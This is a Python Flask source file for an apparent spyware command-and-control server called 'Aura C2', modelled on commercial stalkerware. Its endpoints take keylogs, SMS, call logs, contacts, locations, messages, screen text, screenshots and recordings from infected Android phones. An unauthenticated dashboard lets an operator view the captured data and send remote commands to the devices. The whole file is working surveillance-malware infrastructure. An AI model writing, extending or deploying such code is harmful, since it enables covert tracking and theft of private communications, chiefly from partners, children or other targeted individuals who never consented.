#!/usr/bin/env python3
"""
Aura C2 Server — Flask-based API + Web Dashboard
Inspired by VigilKids/FamiGuard architecture
"""
import os
import json
import base64
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from database import init_db, insert_device, insert_batch, get_pending_commands, mark_command_done, add_command, query

app = Flask(__name__)
CORS(app)
app.secret_key = os.urandom(24)

UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'data', 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ============================================================
#  API ENDPOINTS (Phone → Server)
# ============================================================

@app.route('/api/sync', methods=['POST'])
def sync_data():
    """
    Main sync endpoint. Phone POSTs batched data as JSON.
    Format: {
        "device_id": "abc123",
        "model": "ZTE 7060",
        "android_version": "14",
        "data": {
            "keylogs": [...],
            "notifications": [...],
            "messages": [...],
            "locations": [...],
            "contacts": [...],
            "sms": [...],
            "call_logs": [...],
            "apps": [...],
            "screen_texts": [...]
        }
    }
    """
    try:
        payload = request.get_json(force=True)
        device_id = payload.get('device_id', 'unknown')
        model = payload.get('model', 'unknown')
        android_version = payload.get('android_version', '')
        ip_address = request.remote_addr

        # Register/update device
        insert_device(device_id, model, android_version, ip_address)

        # Insert each data type
        data = payload.get('data', {})
        for table in ['keylogs', 'notifications', 'messages', 'locations',
                       'contacts', 'sms', 'call_logs', 'apps', 'screen_texts']:
            rows = data.get(table, [])
            if rows:
                for r in rows:
                    r['device_id'] = device_id
                insert_batch(table, rows)

        # Check for pending commands
        commands = get_pending_commands(device_id)

        return jsonify({
            'status': 'ok',
            'synced': sum(len(data.get(t, [])) for t in data),
            'commands': commands
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/upload', methods=['POST'])
def upload_file():
    """
    Handle file uploads: screenshots, recordings, downloaded files.
    Expects multipart form with 'file' and 'device_id', 'type', 'timestamp'
    """
    try:
        device_id = request.form.get('device_id', 'unknown')
        file_type = request.form.get('type', 'screenshot')  # screenshot, recording, file
        timestamp = request.form.get('timestamp', datetime.now().isoformat())

        if 'file' not in request.files:
            # Try base64 in JSON body
            payload = request.get_json(force=True)
            device_id = payload.get('device_id', 'unknown')
            file_type = payload.get('type', 'screenshot')
            file_data = base64.b64decode(payload.get('data', ''))
            ext = payload.get('ext', '.jpg')
            timestamp = payload.get('timestamp', datetime.now().isoformat())
        else:
            f = request.files['file']
            file_data = f.read()
            ext = os.path.splitext(f.filename)[1] or '.bin'

        # Save file
        device_dir = os.path.join(UPLOAD_DIR, device_id)
        os.makedirs(device_dir, exist_ok=True)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'{file_type}_{ts}{ext}'
        filepath = os.path.join(device_dir, filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)

        # Record in DB
        table = 'screenshots' if file_type == 'screenshot' else 'recordings'
        insert_batch(table, [{'device_id': device_id, 'filename': filename, 'timestamp': timestamp}])

        return jsonify({'status': 'ok', 'filename': filename})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/command_result', methods=['POST'])
def command_result():
    """Phone reports command execution result."""
    try:
        payload = request.get_json(force=True)
        cmd_id = payload.get('command_id')
        result = payload.get('result', '')
        mark_command_done(cmd_id, result)
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ============================================================
#  DASHBOARD ENDPOINTS (Browser → Server)
# ============================================================

@app.route('/')
@app.route('/dashboard')
def dashboard():
    """Main web dashboard."""
    devices = query('SELECT * FROM devices ORDER BY last_seen DESC')
    return render_template('dashboard.html', devices=devices)


@app.route('/dashboard/device/<device_id>')
def device_detail(device_id):
    """Device detail page with all tabs."""
    device = query('SELECT * FROM devices WHERE device_id = ?', (device_id,))
    if not device:
        return 'Device not found', 404
    return render_template('device.html', device=device[0], device_id=device_id)


@app.route('/api/dashboard/<device_id>/<data_type>')
def get_device_data(device_id, data_type):
    """AJAX endpoint for dashboard tabs."""
    limit = request.args.get('limit', 200, type=int)
    offset = request.args.get('offset', 0, type=int)

    valid_tables = ['keylogs', 'notifications', 'messages', 'locations',
                    'contacts', 'sms', 'call_logs', 'apps', 'screenshots',
                    'recordings', 'commands', 'screen_texts']
    if data_type not in valid_tables:
        return jsonify({'error': 'Invalid data type'}), 400

    rows = query(
        f'SELECT * FROM {data_type} WHERE device_id = ? ORDER BY id DESC LIMIT ? OFFSET ?',
        (device_id, limit, offset)
    )
    return jsonify(rows)


@app.route('/api/dashboard/command', methods=['POST'])
def issue_command():
    """Issue a command to a device from the dashboard."""
    payload = request.get_json(force=True)
    device_id = payload.get('device_id')
    command = payload.get('command')
    params = payload.get('params', '')
    add_command(device_id, command, json.dumps(params) if isinstance(params, dict) else str(params))
    return jsonify({'status': 'ok'})


@app.route('/uploads/<device_id>/<filename>')
def serve_upload(device_id, filename):
    """Serve uploaded files (screenshots, recordings)."""
    device_dir = os.path.join(UPLOAD_DIR, device_id)
    return send_from_directory(device_dir, filename)


# ============================================================
#  MAIN
# ============================================================

if __name__ == '__main__':
    init_db()
    print("\n[*] Aura C2 Server starting...")
    print("[*] Dashboard: http://0.0.0.0:8080/dashboard")
    print("[*] API Sync:  http://0.0.0.0:8080/api/sync")
    print("[*] Upload:    http://0.0.0.0:8080/api/upload\n")
    app.run(host='0.0.0.0', port=8080, debug=False)
